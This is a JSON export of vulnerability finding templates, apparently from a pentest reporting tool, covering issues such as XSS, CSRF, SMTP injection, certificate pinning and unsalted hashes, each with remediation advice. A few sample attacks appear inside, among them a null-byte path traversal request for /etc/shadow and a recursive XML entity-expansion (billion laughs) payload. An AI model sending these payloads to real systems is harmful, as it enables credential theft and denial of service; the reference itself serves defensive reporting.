encoding\n\n","cvss_base_score":3.5,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:N/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Low","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":342,"plugin_id":null,"title":"Lack of Certificate Pinning (iOS)","type":null,"description":"--An attacker may compromise a legitimate Certificate Authority and use it to obtain malicious certificates. Several well-known Certificate Authorities trusted by all devices, such as Comodo and DigiNotar have been compromised in the past.\n--An attacker can trick a user into installing an attacker-controlled certificate.\n--Some public WiFi networks ask users to install a certificate before logging on to their network.\n\n","poc":null,"impact":"Without certificate pinning, attackers who are able to obtain their own certificates for arbitrary websites from Certificate Authorities trusted by the device can perform Man-In-The-Middle attacks on otherwise secure HTTPS network connections. Such attackers will be able to eavesdrop or alter all communications of the mobile application, which may include sensitive information such as credentials and payment details.\n","remediation":"Mobile applications can use certificate pinning as an additional layer of security in order to verify that the certificate presented by the web service is the one the developers expect. Certificate pinning allows mobile applications to have more fine-grained control over the certificates they trust. As mobile applications typically only exchange sensitive information with their own web services, the certificates chains of those services are well known during development and can be hardcoded into the application. \nHowever note that managing certificate pinning can be a complicated process with a potential to cause denial of service when the certificate on a server is updated or replaced. There are multiple approaches to designing the control correctly for each use case and details of such solutions are out of scope of this security assessment. \nCertificate pinning can be implemented on iOS via third party libraries such as Alamofire and TrustKit for iOS.\n","cvss_base_score":8.3,"cvss_temporal_score":6.9,"cvss_vector":"(AV:A/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:OF/RC:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:28:12","approved":1,"v_likelihood":"Minimal","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":343,"plugin_id":null,"title":"Sensitive Functions Available via URL Schemes (iOS)","type":null,"description":"URL schemes are one of the only Apple-approved mechanisms for inter-process communication in iOS. URL schemes in iOS are registered in the Info.plist file by setting the CFBundleURLSchemes attribute to the desired string. For example, if an application by Company A wanted to register a URL scheme, the string could be \"compa\". After registering the URL scheme, any application on the iOS device can open Company A's application by using the \"compa://\" scheme. The URL schemes allow more functionality than just opening an application because applications can also implement a handler for performing specific actions based on the structure of the URL. Actions can be anything from opening a specific page in the application to performing actions against the server like authentication or downloading a file.\n","poc":null,"impact":"Using URL schemes to perform sensitive functions will result in data leakage and other unintended consequences. The iOS platform does not enforce unique URL schemes and if more than one application registers the same scheme there is no way to determine which application will be launched. This means that any application can register the same URL scheme as the target application to intercept requests. Additionally, iOS does not request the user's permission before handling the URL and executing the predefined action. This can result in a malicious site crafting URLs to target the application in order to execute sensitive functions on the user's behalf (e.g., transferring money out of the user's account or resetting a password). It is also possible to man-in-the-middle the requests in order to read data passed between applications. For example, if the application allows authentication via a URL scheme, such as the example below, it is possible for another application to read the user credentials.\nExample URL scheme for authentication in Company A's application with the URL scheme \"compa\":\n<pre>compa://login?username=User1&password=P@55word! </pre>\n","remediation":"The application should remove handlers for all functions that require sensitive information to be passed as part of the URL in order to prevent data leakage. Additionally, the application should confirm actions with the user before executing them. This can be done in the AppDelegate by displaying a confirmation dialog box with a description of the action about to be performed, giving the user a chance to approve or deny the action in question.\n","cvss_base_score":7.2,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:N/C:C/I:C/A:C)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Low","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":344,"plugin_id":null,"title":"SMTP Injection","type":null,"description":"SMTP Injection exists when an application does not properly validate user-supplied data or encode the output of the data before placing it inside of an email message. In the SMTP protocol, commands are separated by a carriage return and line feed, %0D and %0A. SMTP injection occurs when attackers insert these values followed by SMTP commands such as \"MAIL FROM\", \"RCPT TO\", or \"DATA\". When the application sends the payload with the user-supplied input, the SMTP server will blindly send the message.\n","poc":null,"impact":"SMTP Injection allows an attacker to execute arbitrary SMTP commands on a victim email server. An attacker may exploit this vulnerability to send emails with forged email headers impersonating legitimate users from the SMTP server. An attacker may also leverage this vulnerability to disseminate spam and malware originating from the victim SMTP server.\n","remediation":"SMTP Injection is prevented by encoding data before inserting user-supplied values into the generated email. Each carriage return and newline of the data should encoded using URL encoding and the resulting string should then be inserted into the email. This technique of encoding values before inserting them on the web page is called \"Output Encoding\". Once encoded, the SMTP server will view carriage returns and line feeds as string literals.\n","cvss_base_score":4.9,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:S/C:P/I:P/A:N/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":345,"plugin_id":null,"title":"Sensitive Data Stored in Log Files","type":null,"description":"The application or web server captures sensitive data (i.e. financial information, healthcare information, passwords, session ID values, encryption keys and/or other personally identifiable information) within its log files. For example:\n<pre><code class=\"java\">logger.info(\"Username: \" + username + \", Password: \" + password); </pre>\n","poc":null,"impact":"Storing sensitive information within log files can lead to financial loss and/or reputation damage to users and companies. It may also assist attackers in gaining access to systems via information exposure.\n","remediation":"Sensitive information should never be written to log files. If for some reason sensitive information needs to be logged, the log files should be encrypted and require appropriate authentication and authorization mechanisms to access them.\n","cvss_base_score":1.7,"cvss_temporal_score":0,"cvss_vector":"(AV:L/AC:L/Au:S/C:P/I:N/A:N/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Minimal","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":346,"plugin_id":null,"title":"Email Address Pattern Found","type":null,"description":"The application returns email addresses to the client in HTTP responses. Email addresses may appear in the UI, but can appear elsewhere in responses, such as code comments (HTML, JavaScript, etc.), HTTP response headers, etc.\n","poc":null,"impact":"Email addresses returned in HTTP responses may be intercepted at any point after the data has left the server, including:\n--Via direct access to the application if email addresses are included in unauthenticated content, or in responses to requests made by a malicious user with valid credentials\n--In transit during a man-in-the-middle (\"MitM\") attack\n--On the user's system if the HTTP response data is being cached\n--Via injection attacks such as cross-site scripting, which may read the HTML source and transmit email addresses to a malicious third party\n\n","remediation":"Full email addresses should be removed from HTTP responses; if an email address must be displayed to a user for confirmation purposes, the value should first be masked server-side. A masked value refers to an obfuscated version of the data that hides a specific subset of characters. For example, the email address \"first.last@company.com\" would be changed to \"fi****.la****@company.com\" to mask the full address, while still providing minor detail for context. The algorithm designed to mask an email address should not perform a 1-to-1 replacement of characters with the masking character, to prevent an attacker from guessing the address based on length and publicly available information.\nNote email addresses should be masked server-side rather than by client-side code. Any use of client-side code would still require the full email address to be sent within the HTTP response.\n","cvss_base_score":2.1,"cvss_temporal_score":1.6,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:N/A:N/E:POC/RL:OF/RC:C)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Medium","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":347,"plugin_id":null,"title":"Internal IP Disclosure Pattern Found","type":null,"description":"The application discloses internal network IP addresses in responses sent from the server to the client. Internal IP address spaces often fall in one or more of the following ranges:\n<pre>10.0.0.0 - 10.255.255.255 172.16.0.0 - 172.31.255.255 192.168.0.0 - 192.168.255.255 </pre>\n","poc":null,"impact":"Knowing specific internal IP addresses and overall IP address schemes reduces reconnaissance time and aids an attacker in more efficiently crafting targeted attacks against the internal network.\n","remediation":"Internal IP addresses, server names, and other information not relevant to external users should never be returned to application users (e.g. in error messages, HTML comments, etc.). The server and application should be configured to return only generic error messages; all sensitive data relating to the server and internal network should be removed from responses sent by the application to end users. If details about an application or server error are needed for debugging or support reasons, a unique identifier can be created and displayed to the user along with a generic error message for reference. The same unique identifier can be included with the error that is logged to the server so that it can be easily correlated with the error.\n","cvss_base_score":2.1,"cvss_temporal_score":1.6,"cvss_vector":"(AV:N/AC:H/Au:S/C:P/I:N/A:N/E:U/RL:OF/RC:C/CDP:ND/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Low","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Medium","v_impact":"Low","steps_to_reproduce":null,"likelihood_text":null},{"id":348,"plugin_id":null,"title":"Reflected Cross-Site Scripting (XSS)","type":null,"description":"A Reflected Cross-Site Scripting (XSS) vulnerability occurs when a web application sends strings that were provided by an attacker to a victim's browser in such a way that the browser executes part of the string as code. The string contains malicious data and is passed as to the application through a parameter that an attacker can control (e.g. a URL parameter or an HTML form field). The application immediately inserts it into its response. This results in the victim's browser executing the attacker's code within a legitimate user's session. Attackers typically exploit reflected XSS vulnerabilities by sending users malicious links containing JavaScript code (e.g. via e-mail) or by posting malicious code to other sites that the vulnerable application's users may visit.\n","poc":null,"impact":"Reflected Cross-Site Scripting vulnerabilities give the attacker control of the user's browser. The attack can alter page content with malicious HTML or JavaScript code. The attacker can arbitrarily alter page content displayed to the victim and can execute application functions using the victim's application identity if the victim is authenticated to the application. An often cited example use of a Reflected Cross-Site is where the attacker sends himself/herself the victim's session identifier. With this session identifier, the attacker can then perform application functions using that user's identity for the duration of that session.\n","remediation":"Reflected Cross-Site Scripting (XSS) is prevented by encoding data before inserting it into the generated web page. Each character of the data is encoded and the result string is then inserted onto the generated web page. This technique of encoding values before inserting them on the web page is called \"Output Encoding\". Output Encoding libraries exist for most popular programming languages and frameworks.\nA web page has seven different output contexts and each output context requires a different encoding scheme. Data must be encoded using the proper scheme. The seven different encoding schemes are:\n--HTML Text Element\n--HTML Attribute\n--URL Parameter\n--JavaScript Literal\n--HTML Comment\n--HTTP Header\n--CSS Property\n\nLibraries for implementing the encoding schemes exist for most popular programming languages.\n--OWASP Java Encoder: Java only\n--Microsoft Web Protection Library: .NET languages\n--Ruby - escapeHTML() - only supports HTML Text Encoding\n--Jgencoder in JQuery: for preventing DOM-based XSS\n\n--Google Capabilities based JavaScript CAJA\n--OWASP JXT- automatically encodes string data with the proper encoding\n\n","cvss_base_score":8,"cvss_temporal_score":7,"cvss_vector":"(AV:N/AC:L/Au:S/C:P/I:C/A:P/E:H/RL:OF/RC:C/CDP:MH/TD:ND)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:28:18","approved":1,"v_likelihood":"High","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":349,"plugin_id":null,"title":"Link Injection","type":null,"description":"Link injection occurs when the application does not handle user input correctly and the attacker is able to inject a URL into a link on the page. This vulnerability is similar to cross-site scripting. The main difference is that in cross-site scripting a javascript code is injected in the application where as in link injection a URL is injected. This mainly occurs because the application fails to validate and/or sanitize the user inputs. These inputs are then embedded in the response from the application.\n","poc":null,"impact":"A malicious link injected in the application can be clicked by the victim expecting it to be part of the legitimate application. Link injection can be used by an attacker to facilitate various attacks such as: cross-site scripting, phishing, open-redirection, and cross-site request forgery. Requests can be sent to the legitimate application or a malicious application without the victim's permission. In some cases, the victim can then be fooled into supplying confidential information to the attacker. If link injection occurs in an authenticated context it could facilitate an attacker stealing the session of the user.\n","remediation":"Link injection is prevented by encoding data values containing malicious data before inserting the values onto the generated web page. Input Validation is not a viable remediation for link injection because two separate applications are often involved: the first stores the data and a second application generates the web page. Also, many input fields in applications need to accept arbitrary data; filtering out characters is often not acceptable.\nOutput Encoding requires that characters in data that may be interpreted as control characters in a given output context are encoded before they are inserted in that output context (parts of a web page in this case). Output Encoding libraries exist for most popular programming languages and frameworks.\nA web page has seven different output contexts and each output context requires a different encoding scheme. Data must be encoded using the proper scheme. The seven different encoding schemes are:\n--HTML Text Element\n--HTML Attribute\n--URL Parameter\n--JavaScript Literal\n--HTML Comment\n--HTTP Header\n--CSS Property\n--The browser's DOM\n\nURLs have to be encoded twice when they are the value of an HTML Attribute or used in an HTTP Header. The URL must first be encoded using URL encoding and encoded URL is encoded again for use as an HTML Attribute or HTTP Parameter.\nLibraries for implementing the encoding schemes exist for most popular programming languages.\n--OWASP Java Encoder: Java only\n--Microsoft Web Protection Library: .NET languages\n--Ruby - escapeHTML() - only supports HTML Text Encoding\n--Jgencoder in JQuery: for preventing DOM-based XSS\n\n--Google Capabilities based JavaScript CAJA\n--OWASP JXT- automatically encodes string data with the proper encoding\n\n","cvss_base_score":6.4,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:P/I:P/A:N)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":350,"plugin_id":null,"title":"Phishing Through Flash","type":null,"description":"Phishing through Flash occurs when user input is not properly validated and global flash parameters are used in potentially dangerous native functions. Within Flash objects or Flash movies, links may be injected through global variables that redirect users to malicious web sites. The global parameters can be leveraged in one of two ways to create a successful phishing attack. The first method relies on the global parameter being used as an input source. If the parameters stored in the global variable are piped directly into a function that loads data from an external source and if the function does not validate the input, users can be redirected to potentially malicious web sites. The second method depends on how the global parameters are rendered in Flash. If the global parameters are rendered directly to HTML, JavaScript, or a URL, a malicious link can be injected directly into the page.\n","poc":null,"impact":"Victims may be tricked into interacting with a malicious web site through the abuse of Flash functions or code as part of a phishing attack. A phishing attack consists of an attempt to trick a valid application user into providing sensitive information such as login credentials or personal identifiable information directly to an attacker. In the case of phishing through Flash, one attack involves an attacker launching a phishing attack against a user by injecting a malicious link into the \"navigateToURL\" Flash function. When the function is executed in the victim's browser they will be directed to an attacker-controlled page designed to extract information from the user.\n","remediation":"To prevent attackers from generating a phishing attack through Flash, the application must limit or completely avoid the use of dangerous native Flash functions with global parameters while sanitizing user input. Global parameters that contain user defined input must not be used as arguments in the following functions as they can be used to facilitate a phishing attack:\n--navigateToURL\n--Loader.load\n--ExternalInterface.call\n--URLLoader.load\n--getURL\n--loadMovie\n--loadMovieNum\n--loadVariables\n--loadVariablesNum\n--FileReference.download\n--LoadVars.load\n--LoadVars.sendAndLoad\n--MovieClip.getURL\n--MovieClip.loadMovie\n--MovieClip.loadVariables\n--MovieClipLoader.loadClip\n--security.loadPolicyFile\n--Sound.loadSound\n--StyleSheet.load\n--XML.load\n--XML.sendAndLoad\n--XMLSocket.connect\n--NetStream.play\n\n--TextField.htmlText\n--TextFormat.url\n\nA web page has seven different output contexts and each output context requires a different encoding scheme. Data must be encoded according to the proper scheme.\nThe seven different encoding schemes are:\n--HTML Text Element\n--HTML Attribute\n--URL Parameter\n--JavaScript Literal\n--HTML Comment\n--HTTP Header\n--CSS Property\n--The browser's DOM\n\n","cvss_base_score":5.8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:P/A:N/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Medium","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":351,"plugin_id":null,"title":"Phishing Through Frames","type":null,"description":"A phishing through frames vulnerability occurs when a web application sends stored strings containing HTML \"iframe\" tags that were provided by an attacker to a victim's browser in such a way that the browser interprets the iframe tags as code. The code that contains the iframe tag and its attributes may be stored server-side to be replayed to users, or sent directly to a user in the HTTP response.\n","poc":null,"impact":"An attacker can leverage the ability to inject an iframe into a page by executing a phishing attack where an attacker-controlled malicious site is displayed to the victim. Such phishing attacks may be used to trick the victim into yielding sensitive information such as login credentials or personal identifiable information that can be used to impersonate the user in the application or perform potentially harmful actions outside the scope of the application (such as stealing the victim's identity).\n","remediation":"Phishing through frames is prevented by encoding malicious data before inserting the values into the generated web page. Each character of the data is encoded and the result string is then inserted into the generated web page. This technique of encoding values before inserting them into the web page is called \"Output Encoding\". Output encoding libraries exist for most popular programming languages and frameworks.\nA web page has seven different output contexts and each output context requires a different encoding scheme. Data must be encoded according to the proper scheme.\nThe seven different encoding schemes are:\n--HTML Text Element\n--HTML Attribute\n--URL Parameter\n--JavaScript Literal\n--HTML Comment\n--HTTP Header\n--CSS Property\n--The browser's DOM\n\nURLs have to be encoded twice when they are the value of an HTML Attribute or used in an HTTP Header. The URL must first be encoded using URL encoding and encoded URL is encoded again for use as an HTML Attribute or HTTP Parameter.\nLibraries for implementing the encoding schemes exist for most popular programming languages.\n--OWASP Java Encoder:  Java only\n--Microsoft Web Protection Library: .NET languages\n--Ruby - escapeHTML() - only supports HTML Text Encoding\n--Jgencoder in JQuery: for preventing DOM-based XSS\n\n--Google Capabilities based JavaScript CAJA\n--OWASP JXT- automatically encodes string data with the proper encoding\n\n","cvss_base_score":5.8,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:M/Au:N/C:P/I:P/A:N/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"High","v_impact":"Medium","steps_to_reproduce":null,"likelihood_text":null},{"id":352,"plugin_id":null,"title":"Robots.txt File Web Site Structure Exposure","type":null,"description":"The web site's structure is exposed through the detailed list of application directories and files found in the robots.txt file. The robots.txt file provides instructions for web robots to ignore specified portions of the web application when traversed as well as the directives that robots should adhere to. For example, if the application wants to prevent web robots from discovering the directory \"PersonalIdentifiableInformation\", the file would contain the following:\n<pre><code class=\"dart\">User-agent: * Disallow: /PersonalIdentifiableInformation/  </pre>\nWhen full directory names are stored in the robots.txt file in this manner an internet accessible directory listing is created.\n","poc":null,"impact":"Verbose information found in the robots.txt file will result in complete or partial disclosure of a web application's directory structure, as well as the potential exposure of sensitive information. Due to the nature of the robots.txt file all sensitive information placed inside of it will be available to all web robots, and potential attackers. As seen in the example robots.txt below, an attacker can be directed to the location of sensitive data within the application allowing him or her to create targeted attacks against the application.\n<pre><code class=\"dart\">User-agent: * Disallow: /folder1/passwords.txt Disallow: /PersonalIdentifiableInformation/ </pre>\nIn addition to sensitive information exposure, detailed site structure found in the robots.txt file may provide an attacker with details regarding the site's design and underlying technologies. An attacker may use this information to more efficiently craft targeted attacks against the application and web server.\n","remediation":"All files and directories that contain sensitive information must be removed from the robots.txt file located on the web application server. The robots.txt file should not contain any potentially sensitive information, as it provides no protections for the information within it. All sensitive files and directories should be located below the top level directory in a sub directory, as seen in the example below:\n<pre><code class=\"dart\">User-agent: * Disallow: /folder1/ Disallow: /folder2/  </pre>\nIf the structure of the application's directory cannot be reformed to meet this requirement, directories and files should be referred to with partial names. The use of partial names will allow for the robots.txt file to be obfuscated, increasing the effort on the part of an attacker. Note that the shortened name used for a directory or file must be unique within the robots.txt file. An example of an obfuscated robots.txt file can be seen below:\n<pre><code class=\"dart\">User-agent: * Disallow: /pa Disallow: /Pers/ </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:L/Au:N/C:N/I:N/A:N)","cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"High","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":353,"plugin_id":null,"title":"MAC is not enabled in VIEWSTATE","type":null,"description":"We identified that the target web application does not use MAC validation in ViewState data.ASP.NET uses a hash code based integrity solution called \"ViewStateMac\" to protect ViewState parameters against tampering attacks.\n","poc":null,"impact":"An attacker can tamper with the application's state variables located in the ViewState data structure.\n","remediation":"You can implement this solution on a page or application level.\nFor page based protection, place the following directive at the top of affected page.\n<pre><code class=\"vbnet\"><%@Page EnableViewStateMAC=true %> </pre>\nYou can also set this option for the whole application by using web.config files. Apply the following configuration for your application's web.config file.\n<pre><code class=\"xml\"><System.Web>      <pages enableViewState=\"true\">  </System.Web> </pre>\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:01","updated_at":"2018-11-12 09:25:01","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":354,"plugin_id":null,"title":"Null Byte Injection","type":null,"description":"The application mishandles NULL bytes originating from untrusted user input. In certain languages and libraries, the NULL character is used to indicate the end of a string. Functions that process such strings (referred to as \"null-terminated strings\") may treat NULL characters differently depending on their implementation.\nA prime example of this is C's implementation of the strcmp() and strncmp() functions. The strcmp() function will return a value indicating that two strings are of equal value as long as the characters up to the first NULL character in either string are the same. Even if there is data following the first NULL byte, the result is the same. The strncmp() function works in a similar manner, but it also asserts that the length of the strings being compared are the same. Because of a mismatch between the length of the input and the location of the NULL character, further function calls that handle this user input may read past the NULL, altering application behavior.\n","poc":null,"impact":"An attacker can use NULL byte injection to launch a variety of other attacks against the application based on how it handles the presence of injected NULL bytes. Common attack scenarios that leverage the use of prematurely terminated strings include (but are not limited to) path manipulation attacks, bypassing string validation, and buffer overflow attacks.\nConsider a PHP application that takes untrusted user input when including a file on the local filesystem. The path is both prefixed and suffixed by hardcoded strings as below:\n<pre><code class=\"php\">include(\"/path/to/application/\" . $_GET['path'] . \"/included.php\"; </pre>\nAn attacker may submit a malicious parameter with an encoded NULL byte:\n<pre>vulnerablepage.php?path=../../../../../../etc/shadow%00 </pre>\nBecause the NULL character is decoded, it prematurely terminates the include string so that \"/included.php\" is ignored. This allows an attacker to include any file on the server in the server's response.\n","remediation":"The application must properly neutralize NULL characters in untrusted input before using it for any purpose. To do so, input should be canonicalized to the application's own internal representation and then validated.\nBy canonicalizing input, any present NULL bytes will be treated consistently throughout the application. Whitelist validation should then be favored first over other validation techniques since any character or string not explicitly specified as part of the \"known-safe\" set of characters or values is rejected or removed by default. If a sufficient whitelist pattern cannot be determined, blacklist validation can be implemented to provide limited protection by filtering out or rejecting inputs that contain specified characters.\nIn addition to syntactic checks, data should also be checked for size and semantic correctness where possible.\n","cvss_base_score":5.1,"cvss_temporal_score":0,"cvss_vector":"(AV:N/AC:H/Au:N/C:P/I:P/A:P)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:02","updated_at":"2018-11-12 09:25:02","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":356,"plugin_id":null,"title":"Ability to obtain free or discounted merchandise","type":null,"description":"A business logic vulnerability was found in the payment process cycle of the application which might help an attacker to obtain free or discounted merchandise.\n","poc":null,"impact":"It may be possible to purchase at a lower or zero price by tampering the parameters used in he application.\n","remediation":"Although uncovering logical vulnerabilities will probably always remain an art, one can\nattempt to go about it systematically, to a great extent. Here is one suggested approach:\nUnderstanding the application\nCreating raw data for designing logical tests\nDesigning the logical tests\nStandard prerequisites\nExecution of logical tests\n","cvss_base_score":0,"cvss_temporal_score":0,"cvss_vector":null,"cvss_temporal_vector":null,"risk_factor":"Minimal","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:02","updated_at":"2018-11-12 09:25:02","approved":1,"v_likelihood":"Minimal","v_impact":"Minimal","steps_to_reproduce":null,"likelihood_text":null},{"id":359,"plugin_id":null,"title":"Cross-Site Request Forgery (CSRF)","type":null,"description":"A Cross-Site Request Forgery (CSRF) vulnerability occurs when the application fails to ensure that requests received by the server originated from pages served by the application. For example, an attacker creates a malicious website and gets an authenticated user to visit a page on the malicious website. A page from the malicious website sends an HTTP request to the application with data supplied by the attacker. The HTTP request causes the victim's browser to automatically send the user's session cookie along with the request. The application processes the request as though the request had been made from one of the application's pages.\n","poc":null,"impact":"A Cross-Site Request Forgery vulnerability allows an attacker to cause a victim's browser to submit requests that successfully perform sensitive operations to the vulnerable application without the application user's knowledge. The attacker controls all of the function parameters and the application executes the function thinking that it is a legitimate request generated by the user.\n","remediation":"Preventing a CSRF vulnerability requires adding a non-predictable parameter to requests that performs any transaction that modifies the application's data or internal state. This parameter must be part of the form and not stored in the cookie. The easiest way to add a non-predictable parameter is to use a secure hash function, such as SHA-2, to hash the user's session ID. This parameter is referred to as a \"form-authenticator\" because this parameter is checked on the server to ensure that this is a legitimate request from the application. The application includes the form-authenticator when a legitimate page is generated (e.g., as a hidden field). When the form is then submitted, the application verifies that the form-authenticator provided from the form matches the one issued when the page was generated. If they match, the request can be processed; otherwise, the application issues an error indicating the request is invalid.\n","cvss_base_score":4.3,"cvss_temporal_score":3.6,"cvss_vector":"(AV:N/AC:M/Au:N/C:N/I:P/A:N/E:F/RL:OF/RC:C/CDP:LM/TD:ND)","cvss_temporal_vector":null,"risk_factor":"Medium","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:02","updated_at":"2018-11-12 09:25:02","approved":1,"v_likelihood":"Medium","v_impact":"High","steps_to_reproduce":null,"likelihood_text":null},{"id":370,"plugin_id":null,"title":"XML Entity Expansion (Billion Laughs Attack)","type":null,"description":"The application is configured to process recursively defined XML entities, which may lead to a denial of service condition if a sufficiently large set of recursive entity references is defined in the XML request.\nAn XML entity or named entity is an association between a reference (the entity) and a string. When the XML parser sees an entity in the body of a document, it performs a lookup to find the string associated with the entity. Once found, this string is substituted for the entity name in the document body.\nAs an example, consider the following XML file:\n<pre><code class=\"xml\"><!DOCTYPE root [  <!ENTITY ha SYSTEM \"Hello World!\"> ]> <root>&ha;</root> </pre>\nThe XML parser will first load the entity definition in memory and then, when it sees \"&ha\"; it will replace it with the definition of the entity, which in this example is \"Hello World!\". Here is the resulting XML document in memory:\n<pre><code class=\"xml\"><root>Hello World!</root> </pre>\nThe application XML parser will also recursively expand Document Type Definition (DTD) entities while parsing XML documents. The XML entity expansion attack targets parser memory consumption by utilizing recursion in XML entity definitions. The following XML document DOCTYPE requires the parser to make approximately 257 recursions (2n+1 where n equals 128 here): <pre><code class=\"xml\"><!DOCTYPE root [  <!ENTITY ha0 \"content\">  <!ENTITY ha1 \"&ha0; &ha0;\">  <!ENTITY ha2 \"&ha1; &ha1;\"> ... <!ENTITY ha128 \"&ha127; &ha127;\">  ]> <root>&ha128;</root> </pre>\n","poc":null,"impact":"A malicious user may be able to supply a relatively small XML document containing a large number of internal recursive DTD (Document Type Definition) references which would be expanded by the parser into a large quantity of text in memory. The time required to process these DTD references and the large amount of memory consumed by the process may lead to a denial of service condition on applications that utilize the XML parser. During such an attack, legitimate application users would experience extensive delays or be completely unable to access the application.\n","remediation":"Depending on system requirements, one of the following options is available to prevent XML entity expansion attacks:\n--Disable entity expansion when possible.\n--Limit the number of entity reference nodes that the parser can expand.\n--Limit the number of characters entities can expand to.\n\n","cvss_base_score":5,"cvss_temporal_score":3.9,"cvss_vector":"(AV:L/AC:M/Au:S/C:N/I:P/A:C/E:POC/RL:OF/RC:C/CDP:L/TD:M/CR:L/IR:M/AR:H)","cvss_temporal_vector":null,"risk_factor":"High","damage":0,"reproducability":0,"discoverability":0,"exploitability_ease":null,"port":null,"protocol":null,"created_at":"2018-11-12 09:25:02","updated_at":"2018-11-12 09:25:02","approved":1,"v_likelihood":"Medium","v_impact":"Critical","steps_to_reproduce":null,"likelihood_text":null},{"id":381,"plugin_id":null,"title":"Unsalted Password Hashes","type":null,"description":"User passwords are stored as unsalted hashes within the application's backend database. While storing passwords as hashes obscures them in the event that the database is compromised, all hashing algorithms are vulnerable to \"rainbow table\" attacks. A rainbow table is a pre-generated dictionary of hashes and their associated plain-text values. With a rainbow table available, an attacker with a hash needs only to look up that hash in the table to obtain a user's plain-text password. As rainbow tables are readily available, looking up the plain-text value of an unsalted hash would take very little time and effort.\n","poc":null,"impact":"If an attacker gains access to the user database, user credentials will be directly exposed, allowing the attacker to impersonate legitimate users. The attacker could obtain sensitive information, modify or insert new data, as well as perform any other actions available to legitimate users. The impact of such unauthorized access to data and functionality cannot be overstated and may include data loss, large scale failure or inaccuracies in data. This will in turn affect the business goals of availability, integrity, and confidentiality.\nAn attacker may be able to gain access to the application database in several ways. If an attacker discovers a SQL injection flaw in the application that allows them even read-only access, every user's credentials may be exposed. If the application is free of vulnerabilities that expose database information to the attacker through the web application, a potential threat still exists 